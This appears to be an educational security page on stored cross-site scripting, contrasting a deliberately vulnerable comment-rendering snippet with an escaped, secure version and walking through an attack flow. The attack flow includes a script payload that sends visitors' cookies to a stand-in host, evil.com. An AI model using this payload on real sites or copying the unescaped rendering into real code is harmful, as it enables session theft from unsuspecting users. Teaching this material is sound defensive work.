Stored XSS

Payloads are saved to the server without sanitization and rendered raw — every visitor who loads the page executes any injected script automatically.

⚠
Root cause: Comment body is stored as-is and injected into HTML with no escaping. A payload posted once persistently attacks every future visitor — no crafted link required.

Code — Vulnerable vs Secure

🔴 VULNERABLE — GET /api/comments
// ❌ Raw body injected into HTML comments.map(c => ` <div class="comment-body"> ${c.body} </div> `);
⚠ Attacker's <script> in c.body becomes live HTML for every visitor.
🟢 SECURE — GET /api/comments/safe
// ✅ Escape each field at render time comments.map(c => ` <div class="comment-body"> ${escapeHtml(c.body)} </div> `);
✓ <script> → &lt;script&gt; — displays as text, never executes.

Attack Flow — Why Stored XSS Is Most Dangerous

  • 1
    Attacker posts a comment containing <script>fetch('http://evil.com?c='+document.cookie)</script>.
  • 2
    Server saves it verbatim to the database — no validation or encoding.
  • 3
    Every user who visits the comments page receives the page with the script embedded.
  • 4
    Browser executes the script — attacker harvests session cookies of every visitor passively.
  • 5
    No phishing link required. Normal browsing is enough to trigger the attack.
